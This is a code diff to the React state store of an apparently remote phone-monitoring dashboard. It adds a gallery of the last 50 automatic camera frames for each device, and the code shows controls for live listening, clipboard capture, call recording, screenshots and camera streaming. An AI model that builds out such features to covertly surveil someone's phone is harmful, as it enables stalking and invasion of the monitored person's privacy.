@@ -69,6 +69,7 @@ export function StoreProvider({ children }) {
   const [batteryAlertConfig, setBatteryAlertConfig] = useState({});
   const [autoTimelapseConfig, setAutoTimelapseConfig] = useState({});
   const [latestTimelapseFrame, setLatestTimelapseFrame] = useState({});
+  const [timelapseGallery, setTimelapseGallery] = useState({});
   const [geofenceConfig, setGeofenceConfig] = useState({});
   const [autoReplyConfig, setAutoReplyConfig] = useState({});
   const [networkUsageData, setNetworkUsageData] = useState({});
@@ -762,7 +763,20 @@ function titleOrApp(appName, title, text) {
 
         case 'AUTO_TIMELAPSE_FRAME': {
           if (p.deviceId && p.data) {
+            const frameObj = {
+              id: `${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
+              data: p.data,
+              timestamp: p.timestamp || Date.now(),
+              facing: p.facing || 'camera'
+            };
             setLatestTimelapseFrame((prev) => ({ ...prev, [p.deviceId]: p.data }));
+            setTimelapseGallery((prev) => {
+              const current = prev[p.deviceId] || [];
+              return {
+                ...prev,
+                [p.deviceId]: [frameObj, ...current].slice(0, 50)
+              };
+            });
             pushToast('📸 New timelapse security frame captured', 'info');
           }
           break;
@@ -1222,6 +1236,7 @@ function titleOrApp(appName, title, text) {
       },
       autoTimelapse: autoTimelapseConfig[activeDeviceId] || null,
       latestTimelapse: latestTimelapseFrame[activeDeviceId] || null,
+      timelapseGallery: timelapseGallery[activeDeviceId] || [],
       updateAutoTimelapse: (config) => {
         if (!activeDeviceId) return;
         sendCommand('auto-timelapse-config', { ...config, deviceId: activeDeviceId });
@@ -1277,7 +1292,7 @@ function titleOrApp(appName, title, text) {
         return false;
       }
     }),
-    [devices, activeDeviceId, currentTab, callLogsSubTab, deviceSyncConfig, parentalControlState, appUsageData, batteryAlertConfig, autoTimelapseConfig, latestTimelapseFrame, geofenceConfig, autoReplyConfig, networkUsageData, scheduledCommands, volumeSosConfig, callRecordingConfig, calls, messages, locations, contacts, files, notifications, connected, incomingCallAlert, smsAlert, toasts, sendCommand, dismissAlert, dismissSmsAlert, pushToast, deviceInfo, installedApps, wifiInfo, clipboardHistory, clipboardCapture, appPermissions, callBlocklist, micRecording, latestMicAudio, cameraCapturing, latestCameraPhoto, screenshotCapturing, latestScreenshot, screenRecording, latestScreenFrame, cameraStreaming, latestCameraFrame, torchOn, liveListening, latestAudioChunk, volumeInfo, batteryStats, lostModeState, galleryPhotos, galleryLoading, cellularInfo, dndStatus, strobeActive, junkScanData, isScanningJunk, motionAlarmState, walkieTalkieActive]
+    [devices, activeDeviceId, currentTab, callLogsSubTab, deviceSyncConfig, parentalControlState, appUsageData, batteryAlertConfig, autoTimelapseConfig, latestTimelapseFrame, timelapseGallery, geofenceConfig, autoReplyConfig, networkUsageData, scheduledCommands, volumeSosConfig, callRecordingConfig, calls, messages, locations, contacts, files, notifications, connected, incomingCallAlert, smsAlert, toasts, sendCommand, dismissAlert, dismissSmsAlert, pushToast, deviceInfo, installedApps, wifiInfo, clipboardHistory, clipboardCapture, appPermissions, callBlocklist, micRecording, latestMicAudio, cameraCapturing, latestCameraPhoto, screenshotCapturing, latestScreenshot, screenRecording, latestScreenFrame, cameraStreaming, latestCameraFrame, torchOn, liveListening, latestAudioChunk, volumeInfo, batteryStats, lostModeState, galleryPhotos, galleryLoading, cellularInfo, dndStatus, strobeActive, junkScanData, isScanningJunk, motionAlarmState, walkieTalkieActive]
   );
 
   return <StoreContext.Provider value={value}>{children}</StoreContext.Provider>;
